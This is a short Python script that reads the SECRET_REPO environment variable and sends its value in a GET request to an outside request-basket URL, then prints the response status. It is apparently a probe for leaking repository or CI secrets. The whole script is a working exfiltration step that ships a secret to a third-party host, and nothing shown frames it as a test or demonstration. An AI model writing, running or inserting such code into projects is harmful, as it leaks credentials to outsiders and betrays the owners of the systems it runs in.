import os, requests

def main():
    value_env = os.environ.get('SECRET_REPO','blankenv')
    send_request = requests.get(url = f"https://request-baskets-do-app-kxq7h.ondigitalocean.app/6ochysc/{value_env}")
    print(send_request.status_code)

main()
